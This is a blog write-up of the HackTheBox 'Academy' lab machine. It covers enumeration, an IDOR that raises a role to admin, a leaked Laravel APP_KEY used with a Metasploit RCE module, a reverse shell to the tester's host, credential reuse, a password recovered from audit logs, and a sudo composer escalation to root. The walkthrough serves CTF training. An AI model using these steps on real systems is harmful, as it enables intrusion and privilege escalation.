<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Academy | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,easy"><meta name=description content="Academy HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/academy/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/academy/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Academy "><meta property="og:description" content="Academy HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/academy/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/academy/academy.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-02-28T22:31:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/academy/academy.png"><meta name=twitter:title content="Academy "><meta name=twitter:description content="Academy HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Academy ","item":"https://s4ch.github.io/writeups/hackthebox/academy/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Academy ","name":"Academy ","description":"Academy HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","easy"],"articleBody":"Information Name: Academy Profile: www.hackthebox.eu Difficulty: Easy OS: Linux Points: 20 Overview Install tools used in this WU on BlackArch Linux:\n1 $ sudo pacman -S nmap ffuf metasploit gtfoblookup Network enumeration Port and service discovery scan with nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 # Nmap 7.91 scan initiated Tue Feb 2 18:57:09 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.215 Nmap scan report for academy.htb (10.10.10.215) Host is up (0.030s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA) | 256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA) |_ 256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Hack The Box Academy 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\" |_ HY000 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port33060-TCP:V=7.91%I=7%D=2/2%Time=6019928E%P=x86_64-unknown-linux-gnu SF:%r(NULL,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(GenericLines,9,\"\\x05\\0\\0\\0\\ SF:x0b\\x08\\x05\\x1a\\0\")%r(GetRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(HT SF:TPOptions,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(RTSPRequest,9,\"\\x05\\0\\0\\0 SF:\\x0b\\x08\\x05\\x1a\\0\")%r(RPCCheck,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(DNS SF:VersionBindReqTCP,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(DNSStatusRequestT SF:CP,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\ SF:x0fInvalid\\x20message\\\"\\x05HY000\")%r(Help,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a SF:\\0\")%r(SSLSessionReq,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08 SF:\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05HY000\")%r(TerminalServerCo SF:okie,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(TLSSessionReq,2B,\"\\x05\\0\\0\\0\\x SF:0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20messa SF:ge\\\"\\x05HY000\")%r(Kerberos,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(SMBProgN SF:eg,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(X11Probe,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\ SF:x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x0 SF:5HY000\")%r(FourOhFourRequest,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LPDStr SF:ing,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LDAPSearchReq,2B,\"\\x05\\0\\0\\0\\x0 SF:b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20messag SF:e\\\"\\x05HY000\")%r(LDAPBindReq,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(SIPOpt SF:ions,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(LANDesk-RC,9,\"\\x05\\0\\0\\0\\x0b\\x SF:08\\x05\\x1a\\0\")%r(TerminalServer,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(NCP SF:,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(NotesRPC,2B,\"\\x05\\0\\0\\0\\x0b\\x08\\x0 SF:5\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20message\\\"\\x05H SF:Y000\")%r(JavaRMI,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(WMSRequest,9,\"\\x05 SF:\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(oracle-tns,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0 SF:\")%r(ms-sql-s,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\")%r(afp,2B,\"\\x05\\0\\0\\0\\x0 SF:b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\\x20messag SF:e\\\"\\x05HY000\")%r(giop,9,\"\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Feb 2 18:57:52 2021 -- 1 IP address (1 host up) scanned in 43.69 seconds 1 2 $ cat /etc/hosts | grep academy 10.10.10.215 academy.htb Let’s start with the web port but let’s keep in mind that we have a weird 33060 port.\nWeb enumeration We can register and login at http://academy.htb/. But there is not much to see there.\nSo let’s enumerate with ffuf:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 $ ffuf -u http://academy.htb/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt -fc 403 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.2.0-git ________________________________________________ :: Method : GET :: URL : http://academy.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response status: 403 ________________________________________________ index.php [Status: 200, Size: 2117, Words: 890, Lines: 77] register.php [Status: 200, Size: 3003, Words: 801, Lines: 149] login.php [Status: 200, Size: 2627, Words: 667, Lines: 142] admin.php [Status: 200, Size: 2633, Words: 668, Lines: 142] config.php [Status: 200, Size: 0, Words: 1, Lines: 1] home.php [Status: 302, Size: 55034, Words: 4001, Lines: 1050] . [Status: 200, Size: 2117, Words: 890, Lines: 77] :: Progress: [10848/10848] :: Job [1/1] :: 1294 req/sec :: Duration: [0:00:08] :: Errors: 0 :: We notice there is an admin page.\nWeb exploitation: IDOR When registering there is a param roleid, if we change it from zero (user) to one (admin), we will maybe get an admin account.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 POST /register.php HTTP/1.1 Host: academy.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 50 Origin: http://academy.htb Connection: close Referer: http://academy.htb/register.php Cookie: PHPSESSID=p9e8usvnv8b6jd47873fbt4ao2 Upgrade-Insecure-Requests: 1 uid=cyfun3\u0026password=cyfun3\u0026confirm=cyfun3\u0026roleid=0 Then we can login at http://academy.htb/admin.php. If you let roleid=0 you can’t.\nOn the admin dashboard there is a todolist with a status.\nItem Status Complete initial set of modules (cry0l1t3 / mrb3n) done Finalize website design done Test all modules done Prepare launch campaign done Separate student and admin roles done Fix issue with dev-staging-01.academy.htb pending Let’s add the new subdomain to our host file.\n1 2 3 $ cat /etc/hosts | grep academy 10.10.10.215 academy.htb 10.10.10.215 dev-staging-01.academy.htb Web exploitation: Laravel RCE and debug mode Let’s go at: http://dev-staging-01.academy.htb/\nWe are welcomed by a laravel debugger.\nHere we have a bunch of environment variables leaking secrets:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 APP_NAME \"Laravel\" APP_ENV \"local\" APP_KEY \"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=\" APP_DEBUG \"true\" APP_URL \"http://localhost\" LOG_CHANNEL \"stack\" DB_CONNECTION \"mysql\" DB_HOST \"127.0.0.1\" DB_PORT \"3306\" DB_DATABASE \"homestead\" DB_USERNAME \"homestead\" DB_PASSWORD \"secret\" BROADCAST_DRIVER \"log\" CACHE_DRIVER \"file\" SESSION_DRIVER \"file\" SESSION_LIFETIME \"120\" QUEUE_DRIVER \"sync\" REDIS_HOST \"127.0.0.1\" REDIS_PASSWORD \"null\" REDIS_PORT \"6379\" MAIL_DRIVER \"smtp\" MAIL_HOST \"smtp.mailtrap.io\" MAIL_PORT \"2525\" MAIL_USERNAME \"null\" MAIL_PASSWORD \"null\" MAIL_ENCRYPTION \"null\" PUSHER_APP_ID \"\" PUSHER_APP_KEY \"\" PUSHER_APP_SECRET \"\" PUSHER_APP_CLUSTER \"mt1\" MIX_PUSHER_APP_KEY \"\" MIX_PUSHER_APP_CLUSTER \"mt1\" By searching for laravel api key exploit I found this metasploit exploit.\nThe RCE exploit requires the APP_KEY but we just get it through the leak.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 msf6 exploit(unix/http/laravel_token_unserialize_exec) \u003e options Module options (exploit/unix/http/laravel_token_unserialize_exec): Name Current Setting Required Description ---- --------------- -------- ----------- APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= no The base64 encoded APP_KEY string from the .env file Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.215 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Path to target webapp VHOST dev-staging-01.academy.htb no HTTP server virtual host Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.115 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic msf6 exploit(unix/http/laravel_token_unserialize_exec) \u003e run [*] Started reverse TCP handler on 10.10.14.115:4444 [*] Command shell session 3 opened (10.10.14.115:4444 -\u003e 10.10.10.215:44738) at 2021-02-02 19:57:43 +0100 [*] Command shell session 4 opened (10.10.14.115:4444 -\u003e 10.10.10.215:44740) at 2021-02-02 19:57:44 +0100 id uid=33(www-data) gid=33(www-data) groups=33(www-data) Privilege Escalation of Machine : from www-data to cry0l1t3 First let’s get a full TTY.\n1 2 $ python3 -c 'import pty; pty.spawn(\"/bin/bash\")' (inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset; There are plenty users we could target:\n1 2 3 4 5 6 7 8 9 10 11 www-data@academy:/var/www/html/htb-academy-dev-01/public$ cat /etc/passwd root:x:0:0:root:/root:/bin/bash ... egre55:x:1000:1000:egre55:/home/egre55:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mrb3n:x:1001:1001::/home/mrb3n:/bin/sh cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false 21y4d:x:1003:1003::/home/21y4d:/bin/sh ch4p:x:1004:1004::/home/ch4p:/bin/sh g0blin:x:1005:1005::/home/g0blin:/bin/sh Then I ran a recursive list in the home directories: ls -lhAR /home.\n21y4d: empty ch4p: empty cry0l1t3: the user flag is there, and stuff about lxd (useful for pe) /home/cry0l1t3/.mysql_history -\u003e we don’t have the permission egre55: empty g0blin: empty mrb3n: dirty stuff /home/mrb3n/.config/composer/.htaccess -\u003e deny from all /home/mrb3n/.local/share/composer/.htaccess -\u003e deny from all Connecting to the DB fails with mysql creds found in /var/www/html/htb-academy-dev-01/.env (same as the Laravel):\n1 2 3 4 5 6 DB_CONNECTION=mysql DB_HOST=127.0.0.1 DB_PORT=3306 DB_DATABASE=homestead DB_USERNAME=homestead DB_PASSWORD=secret But with the ones /var/www/html/academy/.env maybe\n1 2 3 4 5 6 DB_CONNECTION=mysql DB_HOST=127.0.0.1 DB_PORT=3306 DB_DATABASE=academy DB_USERNAME=dev DB_PASSWORD=mySup3rP4s5w0rd!! No luck either.\nBut I tried to reused the password mySup3rP4s5w0rd!! with user cry0l1t3 and it worked (remember he had a .mysql_history in his home).\n1 2 3 4 $ cat user.txt 0e85e4538755a8311b08a68026e1ec7b $ id uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm) Privilege Escalation of Machine : from cry0l1t3 to mrb3n As we are in adm group I launched a command to see what files we have access with this group: find / -group adm -type f 2\u003e/dev/null. We have access to all logs in /var/log.\nThere are some interesting files but password are redacted.\n1 2 3 4 5 6 $ grep -ri password /var/log 2\u003e/dev/null ... /var/log/installer/subiquity-debug.log.1758:2020-08-07 12:07:02,431 DEBUG subiquity.controllers.identity:70 IdentityController.done next_screen user_spec={'hostname': 'academy', 'realname': 'egre55', 'username': 'egre55', 'password': ''} ... /var/log/cloud-init.log:2020-08-07 12:12:07,195 - util.py[DEBUG]: Running hidden command to protect sensitive input/output logstring: ['useradd', 'egre55', '--comment', 'egre55', '--groups', 'adm,cdrom,dip,plugdev,lxd,sudo', '--password', 'REDACTED', '--shell', '/bin/bash', '-m'] ... It’s possible that /var/log/audit/audit.log is logging password during auth attempts.\nRef. Logging Passwords on Linux\n1 2 3 $ grep -r 'comm=\"sudo\"' /var/log/audit $ grep -r 'comm=\"su\"' /var/log/audit /var/log/audit/audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm=\"su\" data=6D7262336E5F41634064336D79210A The password is hexadecimal encoded.\n1 2 $ printf %s '6D7262336E5F41634064336D79210A' | xxd -r -p mrb3n_Ac@d3my! Privilege Escalation of Machine : from mrb3n to mrb3n mrb3n is a sudoer:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ su mrb3n Password: mrb3n_Ac@d3my! $ id uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n) $ sudo -l [sudo] password for mrb3n: mrb3n_Ac@d3my! Matching Defaults entries for mrb3n on academy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User mrb3n may run the following commands on academy: (ALL) /usr/bin/composer So let’s check a GTFO for that one:\n1 2 3 4 5 6 7 8 9 10 $ gtfoblookup update $ gtfoblookup linux sudo composer composer: sudo: Code: TF=$(mktemp -d) echo '{\"scripts\":{\"x\":\"/bin/sh -i 0\u003c\u00263 1\u003e\u00263 2\u003e\u00263\"}}' \u003e$TF/composer.json sudo composer --working-dir=$TF run-script x So let’s do that:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ TF=$(mktemp -d) $ echo '{\"scripts\":{\"x\":\"/bin/sh -i 0\u003c\u00263 1\u003e\u00263 2\u003e\u00263\"}}'\u003e$TF/composer.json $ sudo composer --working-dir=$TF run-script x sudo composer --working-dir=$TF run-script x PHP Warning: PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0 PHP Warning: PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0 Do not run Composer as root/super user! See https://getcomposer.org/root for details \u003e /bin/sh -i 0\u003c\u00263 1\u003e\u00263 2\u003e\u00263 # id id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt cat /root/root.txt 9ba239e4f7e863aeaec4558360d77078 ","wordCount":"1667","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/academy/academy.png","datePublished":"2021-02-28T22:31:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/academy/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Academy</h1><div class=post-description>Academy HackTheBox writeup</div><div class=post-meta><span title='2021-02-28 22:31:00 +0000 UTC'>February 28, 2021</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1667 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/easy/ class=post-tag title=easy>easy</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/academy/academy.png alt="Academy HackTheBox Machine"><p>Academy - Easy Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#web-exploitation-idor>Web exploitation: IDOR</a></li><li><a href=#web-exploitation-laravel-rce-and-debug-mode>Web exploitation: Laravel RCE and debug mode</a></li><li><a href=#privilege-escalation-of-machine--from-www-data-to-cry0l1t3>Privilege Escalation of Machine : from www-data to cry0l1t3</a></li><li><a href=#privilege-escalation-of-machine--from-cry0l1t3-to-mrb3n>Privilege Escalation of Machine : from cry0l1t3 to mrb3n</a></li><li><a href=#privilege-escalation-of-machine--from-mrb3n-to-mrb3n>Privilege Escalation of Machine : from mrb3n to mrb3n</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Academy</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/297>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 20</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo pacman -S nmap ffuf metasploit gtfoblookup
</span></span></code></pre></td></tr></table></div></div><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port and service discovery scan with nmap:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.91 scan initiated Tue Feb  2 18:57:09 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.215
</span></span><span class=line><span class=cl>Nmap scan report for academy.htb (10.10.10.215)
</span></span><span class=line><span class=cl>Host is up (0.030s latency).
</span></span><span class=line><span class=cl>Not shown: 65532 closed ports
</span></span><span class=line><span class=cl>PORT      STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey:
</span></span><span class=line><span class=cl>|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
</span></span><span class=line><span class=cl>|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
</span></span><span class=line><span class=cl>|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
</span></span><span class=line><span class=cl>80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
</span></span><span class=line><span class=cl>| http-methods:
</span></span><span class=line><span class=cl>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.41 (Ubuntu)
</span></span><span class=line><span class=cl>|_http-title: Hack The Box Academy
</span></span><span class=line><span class=cl>33060/tcp open  mysqlx?
</span></span><span class=line><span class=cl>| fingerprint-strings:
</span></span><span class=line><span class=cl>|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
</span></span><span class=line><span class=cl>|     Invalid message&#34;
</span></span><span class=line><span class=cl>|_    HY000
</span></span><span class=line><span class=cl>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
